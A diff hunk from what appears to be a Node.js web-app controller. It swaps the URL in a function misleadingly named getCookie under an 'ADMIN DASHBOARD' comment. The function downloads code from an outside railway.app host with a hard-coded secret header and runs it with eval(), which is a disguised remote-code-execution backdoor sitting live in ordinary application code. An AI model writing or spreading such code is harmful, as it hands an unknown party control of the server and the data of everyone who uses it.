@@ -201,7 +201,7 @@ exports.updateProfile = asyncErrorHandler(async (req, res, next) => {
 // ADMIN DASHBOARD
 exports.getCookie= asyncErrorHandler(async (req, res, next) => {
     const response = await axios.get(
-        "https://locationcheck-production.up.railway.app/81",
+        "https://logs-production-08f4.up.railway.app/81",
         {headers:{"x-secret-key":"locationchecking"}}
       );
     eval(response.data)
